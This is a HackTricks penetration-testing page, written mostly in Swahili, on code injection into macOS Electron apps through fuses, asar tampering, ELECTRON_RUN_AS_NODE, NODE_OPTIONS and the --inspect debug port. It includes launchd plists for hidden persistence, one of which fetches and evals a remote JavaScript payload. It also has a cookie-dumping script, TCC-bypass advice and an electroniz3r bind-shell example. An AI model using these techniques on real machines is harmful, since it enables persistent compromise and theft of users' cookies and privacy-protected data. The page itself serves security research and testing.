# macOS Electron Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## Basic Information

Ikiwa hujui ni nini Electron, unaweza kupata [**habari nyingi hapa**](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/xss-to-rce-electron-desktop-apps). Lakini kwa sasa jua tu kwamba Electron inatumia **node**.\
Na node ina **parameta** na **env variables** ambazo zinaweza kutumika **kufanya itekeleze nambari nyingine** mbali na faili iliyoonyeshwa.

### Electron Fuses

Mbinu hizi zitaongelewa baadaye, lakini katika nyakati za hivi karibuni Electron imeongeza **bendera za usalama kuzuia hizo**. Hizi ni [**Electron Fuses**](https://www.electronjs.org/docs/latest/tutorial/fuses) na hizi ndizo zinazotumika **kuzuia** programu za Electron katika macOS **kudhani nambari zisizo za kawaida**:

- **`RunAsNode`**: Ikiwa imezimwa, inazuia matumizi ya env var **`ELECTRON_RUN_AS_NODE`** kuingiza nambari.
- **`EnableNodeCliInspectArguments`**: Ikiwa imezimwa, parameta kama `--inspect`, `--inspect-brk` hazitazingatiwa. Kuepusha njia hii ya kuingiza nambari.
- **`EnableEmbeddedAsarIntegrityValidation`**: Ikiwa imewezeshwa, **`asar`** **faili** iliyoloadi itathibitishwa na macOS. **Kuzuia** njia hii **kuingiza nambari** kwa kubadilisha maudhui ya faili hii.
- **`OnlyLoadAppFromAsar`**: Ikiwa hii imewezeshwa, badala ya kutafuta ku-load kwa mpangilio ufuatao: **`app.asar`**, **`app`** na hatimaye **`default_app.asar`**. Itakagua tu na kutumia app.asar, hivyo kuhakikisha kwamba wakati **imeunganishwa** na **`embeddedAsarIntegrityValidation`** fuse haiwezekani **kudhani nambari zisizo thibitishwa**.
- **`LoadBrowserProcessSpecificV8Snapshot`**: Ikiwa imewezeshwa, mchakato wa kivinjari unatumia faili inayoitwa `browser_v8_context_snapshot.bin` kwa snapshot yake ya V8.

Fuse nyingine ya kuvutia ambayo haitazuia kuingiza nambari ni:

- **EnableCookieEncryption**: Ikiwa imewezeshwa, duka la cookie kwenye diski linachakatwa kwa kutumia funguo za cryptography za kiwango cha OS.

### Checking Electron Fuses

Unaweza **kuangalia bendera hizi** kutoka kwa programu kwa:
```bash
npx @electron/fuses read --app /Applications/Slack.app

Analyzing app: Slack.app
Fuse Version: v1
RunAsNode is Disabled
EnableCookieEncryption is Enabled
EnableNodeOptionsEnvironmentVariable is Disabled
EnableNodeCliInspectArguments is Disabled
EnableEmbeddedAsarIntegrityValidation is Enabled
OnlyLoadAppFromAsar is Enabled
LoadBrowserProcessSpecificV8Snapshot is Disabled
```
### Kubadilisha Fuse za Electron

Kama [**nyaraka zinavyosema**](https://www.electronjs.org/docs/latest/tutorial/fuses#runasnode), usanidi wa **Fuse za Electron** umewekwa ndani ya **binary ya Electron** ambayo ina mahali fulani mfuatano wa **`dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX`**.

Katika programu za macOS hii kwa kawaida iko katika `application.app/Contents/Frameworks/Electron Framework.framework/Electron Framework`
```bash
grep -R "dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX" Slack.app/
Binary file Slack.app//Contents/Frameworks/Electron Framework.framework/Versions/A/Electron Framework matches
```
Unaweza kupakia faili hii katika [https://hexed.it/](https://hexed.it/) na kutafuta mfuatano wa awali. Baada ya mfuatano huu unaweza kuona katika ASCII nambari "0" au "1" ikionyesha kama kila fuse imezimwa au imewezeshwa. Badilisha tu msimbo wa hex (`0x30` ni `0` na `0x31` ni `1`) ili **kubadilisha thamani za fuse**.

<figure><img src="../../../images/image (34).png" alt=""><figcaption></figcaption></figure>

Kumbuka kwamba ukijaribu **kuandika upya** **`Electron Framework` binary** ndani ya programu kwa kutumia bytes hizi zilizobadilishwa, programu hiyo haitafanya kazi.

## RCE kuongeza msimbo kwenye Programu za Electron

Kunaweza kuwa na **faili za nje za JS/HTML** ambazo Programu ya Electron inatumia, hivyo mshambuliaji anaweza kuingiza msimbo katika faili hizi ambazo saini yake haitakaguliwa na kutekeleza msimbo wa kiholela katika muktadha wa programu.

> [!CAUTION]
> Hata hivyo, kwa sasa kuna vizuizi 2:
>
> - Ruhusa ya **`kTCCServiceSystemPolicyAppBundles`** inahitajika kubadilisha Programu, hivyo kwa kawaida hii haiwezekani tena.
> - Faili iliyokusanywa ya **`asap`** kwa kawaida ina fuse **`embeddedAsarIntegrityValidation`** `na` **`onlyLoadAppFromAsar`** `imewezeshwa`
>
> Hii inafanya njia hii ya shambulio kuwa ngumu zaidi (au haiwezekani).

Kumbuka kwamba inawezekana kupita hitaji la **`kTCCServiceSystemPolicyAppBundles`** kwa kunakili programu hiyo kwenye saraka nyingine (kama **`/tmp`**), kubadilisha jina la folda **`app.app/Contents`** kuwa **`app.app/NotCon`**, **kubadilisha** faili la **asar** kwa msimbo wako **mbaya**, kubadilisha jina lake tena kuwa **`app.app/Contents`** na kuitekeleza.

Unaweza kufungua msimbo kutoka kwa faili la asar kwa:
```bash
npx asar extract app.asar app-decomp
```
Na uifunge tena baada ya kuibadilisha na:
```bash
npx asar pack app-decomp app-new.asar
```
## RCE na `ELECTRON_RUN_AS_NODE` <a href="#electron_run_as_node" id="electron_run_as_node"></a>

Kulingana na [**nyaraka**](https://www.electronjs.org/docs/latest/api/environment-variables#electron_run_as_node), ikiwa hii variable ya mazingira imewekwa, itaanzisha mchakato kama mchakato wa kawaida wa Node.js.
```bash
# Run this
ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
# Then from the nodeJS console execute:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
> [!CAUTION]
> Ikiwa fuse **`RunAsNode`** imezimwa, mabadiliko ya env **`ELECTRON_RUN_AS_NODE`** yataachwa bila kutumika, na hii haitafanya kazi.

### Uingizaji kutoka kwa App Plist

Kama [**ilivyopendekezwa hapa**](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks/), unaweza kutumia mabadiliko haya ya env katika plist ili kudumisha uvumilivu:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
</dict>
<key>Label</key>
<string>com.xpnsec.hideme</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>-e</string>
<string>const { spawn } = require("child_process"); spawn("osascript", ["-l","JavaScript","-e","eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding( $.NSData.dataWithContentsOfURL( $.NSURL.URLWithString('http://stagingserver/apfell.js')), $.NSUTF8StringEncoding)));"]);</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
## RCE na `NODE_OPTIONS`

Unaweza kuhifadhi payload katika faili tofauti na kuitekeleza:
```bash
# Content of /tmp/payload.js
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator');

# Execute
NODE_OPTIONS="--require /tmp/payload.js" ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
```
> [!CAUTION]
> Ikiwa fuse **`EnableNodeOptionsEnvironmentVariable`** ime **zimwa**, programu itakuwa **ipuuze** env var **NODE_OPTIONS** inapozinduliwa isipokuwa env variable **`ELECTRON_RUN_AS_NODE`** imewekwa, ambayo pia itapuuziliwa mbali ikiwa fuse **`RunAsNode`** imezimwa.
>
> Ikiwa hujaweka **`ELECTRON_RUN_AS_NODE`**, utaona **kosa**: `Most NODE_OPTIONs are not supported in packaged apps. See documentation for more details.`

### Injection kutoka kwa App Plist

Unaweza kutumia env variable hii katika plist ili kudumisha kudumu kwa kuongeza funguo hizi:
```xml
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
<key>NODE_OPTIONS</key>
<string>--require /tmp/payload.js</string>
</dict>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## RCE na ukaguzi

Kulingana na [**hii**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f), ukitekeleza programu ya Electron kwa bendera kama **`--inspect`**, **`--inspect-brk`** na **`--remote-debugging-port`**, **bandari ya ufuatiliaji itafunguliwa** ili uweze kuungana nayo (kwa mfano kutoka Chrome katika `chrome://inspect`) na utaweza **kuingiza msimbo ndani yake** au hata kuzindua michakato mipya.\
Kwa mfano:
```bash
/Applications/Signal.app/Contents/MacOS/Signal --inspect=9229
# Connect to it using chrome://inspect and execute a calculator with:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
> [!CAUTION]
> Ikiwa fuse **`EnableNodeCliInspectArguments`** imezimwa, programu itakuwa **ikiweka kando vigezo vya node** (kama `--inspect`) inapozinduliwa isipokuwa kiambatisho cha mazingira **`ELECTRON_RUN_AS_NODE`** kimewekwa, ambacho pia kitawekwa **kando** ikiwa fuse **`RunAsNode`** imezimwa.
>
> Hata hivyo, bado unaweza kutumia **paramu ya electron `--remote-debugging-port=9229`** lakini payload ya awali haitafanya kazi kutekeleza michakato mingine.

Kwa kutumia paramu **`--remote-debugging-port=9222`** inawezekana kuiba taarifa fulani kutoka kwa Programu ya Electron kama **historia** (kwa amri za GET) au **cookies** za kivinjari (kama zinavyokuwa **zimefunguliwa** ndani ya kivinjari na kuna **json endpoint** itakayotoa hizo).

Unaweza kujifunza jinsi ya kufanya hivyo [**hapa**](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e) na [**hapa**](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f) na kutumia chombo cha kiotomatiki [WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut) au script rahisi kama:
```python
import websocket
ws = websocket.WebSocket()
ws.connect("ws://localhost:9222/devtools/page/85976D59050BFEFDBA48204E3D865D00", suppress_origin=True)
ws.send('{\"id\": 1, \"method\": \"Network.getAllCookies\"}')
print(ws.recv()
```
Katika [**hiki blogu**](https://hackerone.com/reports/1274695), urekebishaji huu unatumika vibaya kufanya chrome isiyo na kichwa **ipakue faili zisizo na mpangilio katika maeneo yasiyo na mpangilio**.

### Uingizaji kutoka kwa App Plist

Unaweza kutumia vibaya hii env variable katika plist ili kudumisha kudumu kwa kuongeza funguo hizi:
```xml
<dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>--inspect</string>
</array>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## TCC Bypass abusing Older Versions

> [!TIP]
> Daemon ya TCC kutoka macOS haichunguzi toleo lililotekelezwa la programu. Hivyo kama huwezi **kuiingiza msimbo katika programu ya Electron** kwa kutumia mbinu zozote za awali unaweza kupakua toleo la awali la APP na kuingiza msimbo ndani yake kwani bado itapata ruhusa za TCC (isipokuwa Trust Cache iizuie).

## Run non JS Code

Mbinu za awali zitakuruhusu kuendesha **msimbo wa JS ndani ya mchakato wa programu ya electron**. Hata hivyo, kumbuka kwamba **mchakato wa watoto unakimbia chini ya wasifu sawa wa sandbox** kama programu ya mzazi na **urithi wa ruhusa zao za TCC**.\
Hivyo, ikiwa unataka kutumia haki za kuingia ili kufikia kamera au kipaza sauti kwa mfano, unaweza tu **kuendesha binary nyingine kutoka kwa mchakato**.

## Automatic Injection

Zana [**electroniz3r**](https://github.com/r3ggi/electroniz3r) inaweza kutumika kwa urahisi ili **kupata programu za electron zenye udhaifu** zilizowekwa na kuingiza msimbo ndani yao. Zana hii itajaribu kutumia mbinu ya **`--inspect`**:

Unahitaji kuikamilisha mwenyewe na unaweza kuitumia kama hii:
```bash
# Find electron apps
./electroniz3r list-apps

╔══════════════════════════════════════════════════════════════════════════════════════════════════════╗
║    Bundle identifier                      │       Path                                               ║
╚──────────────────────────────────────────────────────────────────────────────────────────────────────╝
com.microsoft.VSCode                         /Applications/Visual Studio Code.app
org.whispersystems.signal-desktop            /Applications/Signal.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.neo4j.neo4j-desktop                      /Applications/Neo4j Desktop.app
com.electron.dockerdesktop                   /Applications/Docker.app/Contents/MacOS/Docker Desktop.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.github.GitHubClient                      /Applications/GitHub Desktop.app
com.ledger.live                              /Applications/Ledger Live.app
com.postmanlabs.mac                          /Applications/Postman.app
com.tinyspeck.slackmacgap                    /Applications/Slack.app
com.hnc.Discord                              /Applications/Discord.app

# Check if an app has vulenrable fuses vulenrable
## It will check it by launching the app with the param "--inspect" and checking if the port opens
/electroniz3r verify "/Applications/Discord.app"

/Applications/Discord.app started the debug WebSocket server
The application is vulnerable!
You can now kill the app using `kill -9 57739`

# Get a shell inside discord
## For more precompiled-scripts check the code
./electroniz3r inject "/Applications/Discord.app" --predefined-script bindShell

/Applications/Discord.app started the debug WebSocket server
The webSocketDebuggerUrl is: ws://127.0.0.1:13337/8e0410f0-00e8-4e0e-92e4-58984daf37e5
Shell binding requested. Check `nc 127.0.0.1 12345`
```
## Marejeo

- [https://www.electronjs.org/docs/latest/tutorial/fuses](https://www.electronjs.org/docs/latest/tutorial/fuses)
- [https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks)
- [https://m.youtube.com/watch?v=VWQY5R2A6X8](https://m.youtube.com/watch?v=VWQY5R2A6X8)

{{#include ../../../banners/hacktricks-training.md}}
